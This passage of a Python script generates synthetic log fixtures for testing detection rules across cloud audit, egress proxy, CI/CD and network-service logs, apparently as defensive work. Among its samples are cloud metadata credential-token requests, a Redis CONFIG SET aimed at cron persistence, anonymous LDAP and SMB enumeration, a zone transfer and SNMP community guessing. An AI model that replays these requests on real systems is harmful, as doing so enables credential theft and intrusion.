    """События GCP Cloud Audit Logs (плоские ключи protoPayload.*)."""
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T15:00:01Z",
                 "protoPayload.methodName": "google.iam.admin.v1.CreateServiceAccountKey",
                 "protoPayload.authenticationInfo.principalEmail":
                     "dev-user@hackbook-lab.iam.gserviceaccount.com",
                 "protoPayload.resourceName":
                     "projects/hackbook-lab/serviceAccounts/exporter@hackbook-lab.iam.gserviceaccount.com",
                 "note": "создан долгосрочный ключ сервисного аккаунта"})
    rows.append({"ts": "2026-10-20T15:00:02Z",
                 "protoPayload.methodName": "google.iam.admin.v1.SetIamPolicy",
                 "protoPayload.authenticationInfo.principalEmail":
                     "admin@hackbook-lab.iam.gserviceaccount.com",
                 "protoPayload.resourceName": "projects/hackbook-lab",
                 "protoPayload.request.role": "roles/editor",
                 "note": "SA выдан roles/editor на весь проект"})
    rows.append({"ts": "2026-10-20T15:00:03Z",
                 "protoPayload.methodName": "v1.compute.instances.list",
                 "protoPayload.authenticationInfo.principalEmail":
                     "monitoring@hackbook-lab.iam.gserviceaccount.com",
                 "note": "обычная операция инвентаризации — не совпадение"})
    return rows


def azure_audit() -> list[dict]:
    """События Azure Activity Log / управления ресурсами."""
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T16:00:01Z",
                 "operationName": "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION",
                 "caller": "dev-user@corp.onmicrosoft.com",
                 "resourceProvider": "Microsoft.Storage",
                 "resourceGroup": "rg-prod", "status": "Succeeded",
                 "note": "запрошены ключи доступа storage-аккаунта"})
    rows.append({"ts": "2026-10-20T16:00:02Z",
                 "operationName": "MICROSOFT.WEB/SITES/CONFIG/LIST/ACTION",
                 "caller": "dev-user@corp.onmicrosoft.com",
                 "resourceProvider": "Microsoft.Web",
                 "resourceGroup": "rg-prod", "status": "Succeeded",
                 "note": "чтение appsettings App Service (connection strings в открытом виде)"})
    rows.append({"ts": "2026-10-20T16:00:03Z",
                 "operationName": "MICROSOFT.STORAGE/STORAGEACCOUNTS/READ",
                 "caller": "monitor@corp.onmicrosoft.com",
                 "resourceProvider": "Microsoft.Storage",
                 "resourceGroup": "rg-prod", "status": "Succeeded",
                 "note": "чтение метаданных (не секретов) — не совпадение"})
    # Entra hybrid PRT SSO (a7b8c9d0-0011)
    rows.append({"ts": "2026-10-20T16:01:01Z", "operationName": "Sign-in",
                 "category": "SignInLogs",
                 "userPrincipalName": "ivanov@corp.lab",
                 "appDisplayName": "Microsoft Graph",
                 "resourceDisplayName": "Microsoft Graph",
                 "source_ip": "203.0.113.70", "status": "Succeeded",
                 "prt_sso": True, "device_compliant": False,
                 "note": "PRT SSO с некорпоративного/неизвестного устройства"})
    rows.append({"ts": "2026-10-20T16:01:02Z", "operationName": "Sign-in",
                 "category": "SignInLogs",
                 "userPrincipalName": "petrova@corp.lab",
                 "appDisplayName": "Office 365 Exchange Online",
                 "resourceDisplayName": "Office 365 Exchange Online",
                 "source_ip": "10.10.20.15", "status": "Succeeded",
                 "prt_sso": True, "device_compliant": True,
                 "note": "обычный PRT SSO на управляемом устройстве — не совпадение"})
    return rows


def egress_proxy() -> list[dict]:
    """Журнал egress-прокси/файрвола: исходящие HTTP рабочих нагрузок."""
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T17:00:01Z", "src_ip": "10.10.50.5",
                 "dst_ip": "169.254.169.254", "dst_port": 80,
                 "http_host": "metadata.google.internal", "http_method": "GET",
                 "uri": "/computeMetadata/v1/instance/service-accounts/default/token",
                 "note": "GCP: запрос токена сервисного аккаунта из метаданных"})
    rows.append({"ts": "2026-10-20T17:00:02Z", "src_ip": "10.10.50.6",
                 "dst_ip": "169.254.169.254", "dst_port": 80,
                 "http_host": "169.254.169.254", "http_method": "GET",
                 "uri": "/latest/meta-data/iam/security-credentials/ecs-role",
                 "note": "AWS IMDSv1: учётные данные роли без PUT-токена сессии"})
    rows.append({"ts": "2026-10-20T17:00:03Z", "src_ip": "10.10.50.7",
                 "dst_ip": "169.254.169.254", "dst_port": 80,
                 "http_host": "169.254.169.254", "http_method": "GET",
                 "uri": "/metadata/identity/oauth2/token?api-version=2018-02-01"
                      "&resource=https://management.azure.com/",
                 "note": "Azure IMDS: токен managed identity"})
    rows.append({"ts": "2026-10-20T17:00:04Z", "src_ip": "10.10.50.8",
                 "dst_ip": "93.184.216.34", "dst_port": 443,
                 "http_host": "api.example.com", "http_method": "GET",
                 "uri": "/v1/data", "note": "обычный исходящий трафик — не совпадение"})
    return rows


def cicd_log() -> list[dict]:
    """Журналы CI/CD: GitLab runner/API-события и операции с образами."""
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T18:00:01Z", "event_type": "runner_registration",
                 "runner_token_prefix": "glrt-", "source_ip": "203.0.113.40",
                 "project_path": "backend/api",
                 "note": "регистрация нового раннера с внешнего IP"})
    rows.append({"ts": "2026-10-20T18:00:02Z", "event_type": "api_request",
                 "auth_kind": "ci_job_token", "source_ip": "203.0.113.40",
                 "api_path": "/api/v4/projects", "status": 200,
                 "note": "job-токен перечисляет проекты GitLab API"})
    rows.append({"ts": "2026-10-20T18:00:03Z", "event_type": "job_start",
                 "source_ip": "10.10.60.5", "project_path": "frontend/site",
                 "note": "обычная задача на внутреннем раннере — не совпадение"})
    rows.append({"ts": "2026-10-20T18:01:01Z", "event_type": "image_push",
                 "registry": "registry.corp.lab", "image": "payments/api",
                 "tag": "latest", "signed": False, "digest_verified": False,
                 "note": "push неподписанного образа с mutable-тегом"})
    rows.append({"ts": "2026-10-20T18:01:02Z", "event_type": "image_pull",
                 "registry": "registry.corp.lab", "image": "alpine",
                 "tag": "3.19", "signed": False, "digest_verified": False,
                 "note": "pull по тегу без проверки digest и подписи"})
    rows.append({"ts": "2026-10-20T18:01:03Z", "event_type": "image_push",
                 "registry": "registry.corp.lab", "image": "frontend/site",
                 "tag": "v1.2.3", "signed": True, "digest_verified": True,
                 "note": "подписанный релиз — не совпадение"})
    return rows


def network_services() -> list[dict]:
    """Журналы сетевых сервисов (BIND, vsftpd, slapd, Redis, smbd, snmpd).

    Синтетические события для правил a7b8c9d0-0001..0007. Поле service
    заменяет разнородные источники: в проде это syslog разных демонов.
    """
    rows: list[dict] = []
    rows.append({"ts": "2026-10-20T19:00:01Z", "service": "bind", "source_ip": "10.10.20.90",
                 "message": "client @0x7f8c 10.10.20.90#54321 (lab.local): "
                            "transfer of 'lab.local/IN': AXFR started",
                 "note": "запрос полной передачи зоны AXFR"})
    rows.append({"ts": "2026-10-20T19:00:02Z", "service": "bind", "source_ip": "10.10.20.90",
                 "message": "client @0x7f8c 10.10.20.90#54321 (lab.local): "
                            "zone transfer 'lab.local/IN': AXFR ended: 234 records",
                 "note": "передача зоны завершена — утечка всех записей"})
    rows.append({"ts": "2026-10-20T19:00:03Z", "service": "bind", "source_ip": "10.10.30.2",
                 "message": "client @0x7f1a 10.10.30.2#41000 (app.corp.lab): "
                            "query: app.corp.lab IN A +E(0)K",
                 "note": "обычный A-запрос — не совпадение"})
    rows.append({"ts": "2026-10-20T19:01:01Z", "service": "vsftpd", "source_ip": "203.0.113.50",
                 "message": "[ftp] login ok: user=anonymous, anon-password=anonymous@",
                 "note": "анонимный вход на FTP"})
    rows.append({"ts": "2026-10-20T19:01:02Z", "service": "vsftpd", "source_ip": "203.0.113.50",
                 "message": "[ftp] FTP response: Client \"203.0.113.50\", "
                            "USER anonymous -> 230 Login successful",
                 "note": "USER anonymous принят сервером"})
    rows.append({"ts": "2026-10-20T19:01:03Z", "service": "vsftpd", "source_ip": "10.10.20.5",
                 "message": "[ftp] login ok: user=deploy",
                 "note": "обычный вход пользователя — не совпадение"})
    rows.append({"ts": "2026-10-20T19:02:01Z", "service": "slapd", "source_ip": "10.10.20.91",
                 "message": "conn=1001 op=0 BIND dn=\"\" method=128 (anonymous)",
                 "note": "LDAP anonymous bind принят"})
    rows.append({"ts": "2026-10-20T19:02:02Z", "service": "slapd", "source_ip": "10.10.20.91",
                 "message": "conn=1001 op=1 SRCH base=\"dc=lab,dc=local\" scope=2 "
                            "filter=\"(objectclass=*)\"",
                 "note": "перечисление всего дерева после анонимного bind"})
    rows.append({"ts": "2026-10-20T19:02:03Z", "service": "slapd", "source_ip": "10.10.20.6",
                 "message": "conn=1002 op=0 BIND dn=\"cn=app,dc=lab,dc=local\" method=128",
                 "note": "служебный simple bind — не совпадение"})
    rows.append({"ts": "2026-10-20T19:03:01Z", "service": "redis", "source_ip": "10.10.20.92",
                 "message": "Accepted connection from 10.10.20.92:44322; "
                            "command=INFO keyspace without AUTH",
                 "note": "команда к Redis без аутентификации"})
    rows.append({"ts": "2026-10-20T19:03:02Z", "service": "redis", "source_ip": "10.10.20.92",
                 "message": "command=CONFIG SET dir /var/spool/cron/crontabs (no AUTH)",
                 "note": "CONFIG SET — попытка закрепления через cron"})
    rows.append({"ts": "2026-10-20T19:04:01Z", "service": "smbd", "source_ip": "10.10.20.93",
                 "message": "Session setup: NULL session (user='', domain='') from 10.10.20.93",
                 "note": "SMB null-сессия установлена"})
    rows.append({"ts": "2026-10-20T19:04:02Z", "service": "smbd", "source_ip": "10.10.20.93",
                 "message": "IPC$ share access granted to anonymous user",
                 "note": "анонимный доступ к IPC$ (перечисление шар/пайпов)"})
    rows.append({"ts": "2026-10-20T19:05:01Z", "service": "snmpd", "source_ip": "203.0.113.60",
                 "message": "Connection from UDP: [203.0.113.60]:41234->[10.10.10.1] "
                            "community=public GET sysDescr.0",
                 "note": "SNMP-запрос с community 'public'"})
    rows.append({"ts": "2026-10-20T19:05:02Z", "service": "snmpd", "source_ip": "203.0.113.60",
                 "message": "Received SNMP packet with bad community string 'private'",
                 "note": "перебор community-строк"})
    return rows


def main() -> int:
    print("Генерация фикстур детект-правил (синтетические события):")
    write_jsonl("windows-security.jsonl", windows_security())
    write_jsonl("windows-sysmon.jsonl", windows_sysmon(), windows=True)
    write_jsonl("linux-auditd.jsonl", linux_auditd())
    write_jsonl("windows-rdp.jsonl", windows_rdp(), windows=True)
    write_jsonl("mail-smtp.jsonl", mail_smtp())
    write_jsonl("linux-auth-ssh.jsonl", linux_auth_ssh())
    write_jsonl("webserver-access.jsonl", webserver())
    write_jsonl("application-log.jsonl", application_log())
    write_jsonl("cloudtrail.jsonl", cloudtrail())
    write_jsonl("database-error.jsonl", database_error())
    write_jsonl("dns-log.jsonl", dns_log())
    write_jsonl("gateway-log.jsonl", gateway_log())
    write_jsonl("k8s-audit.jsonl", k8s_audit())
    write_jsonl("gcp-audit.jsonl", gcp_audit())
    write_jsonl("azure-audit.jsonl", azure_audit())
    write_jsonl("egress-proxy.jsonl", egress_proxy())
    write_jsonl("cicd-log.jsonl", cicd_log())
    write_jsonl("network-services.jsonl", network_services())
    print("Готово. Прогон: python tools/rules-tester.py --verbose")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
